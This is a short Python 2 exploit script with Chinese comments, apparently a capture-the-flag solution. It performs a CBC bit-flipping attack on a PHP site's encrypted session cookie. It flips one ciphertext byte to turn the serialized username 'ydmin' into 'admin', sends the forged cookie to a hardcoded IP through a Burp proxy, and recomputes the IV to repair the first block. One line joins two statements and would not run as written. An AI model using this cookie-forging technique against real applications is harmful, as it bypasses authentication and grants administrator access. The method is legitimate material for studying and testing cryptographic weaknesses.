import base64
import urllib
import requests
import re
session = "uubpkpbv56dtkiorccjc8md3r0"
cipher = "gn5OKkTDH1CXJv9w11bK7JEqnhzhGSzVs84FNwZ2Zfi1c1PEeQdF1jUXn2lIy3SInj8pJiVajWEF73Fl%2BgLThA%3D%3D"
iv = "PGUt3F%2FPwu93r7DGTBQvKg%3D%3D"

#进行url编码解码和base64解码操作
iv_raw = base64.b64decode(urllib.unquote(iv))
cipher_raw = base64.b64decode(urllib.unquote(cipher))
#a:2:{s:8:"username";s:5:"ydmin";s:8:"password";s:3:"123"}

#计算修正cipher，使得第二块的y可以变成a（原理回顾上述异或结论）
cipher_new = cipher_raw[0:9] + chr(ord(cipher_raw[9]) ^ ord('y') ^ ord('a') ) + cipher_raw[10:] cipher_new = urllib.quote(base64.b64encode(cipher_new))
print cipher_new
#########################################################

#拿新的cipher作为cookie访问，拿到继续修正iv的数据
url="http://118.89.219.210:49168/index.php"
cooky={ "iv":iv, "cipher":cipher_new, "PHPSESSID":session }
#这里本地测试，使用了Burpsuit代理
proxy={ "http":"http://192.168.155.1:8082" }
x = requests.session()
res = x.get(url, cookies=cooky, proxies=proxy)
text = str(res.text)
#print text
########################################################

#使用正则提取目前cipher解密后的结果（第一块损坏）
prog = re.compile("decode\('(.*)'\)")
match = prog.search(text)
new_plain = "" 
if match: new_plain = match.group(1)
#print new_plain
new_plain = base64.b64decode(new_plain)
########################################################

#对iv进行修正，使得新的iv可以使得第一块密文块解密得到正确结果
real_first_blk = 'a:2:{s:8:"userna'
iv_new=""
for i in range(0,16):
    iv_new += chr(ord(iv_raw[i]) ^ ord(new_plain[i]) ^ ord(real_first_blk[i]))
print urllib.quote(base64.b64encode(iv_new))
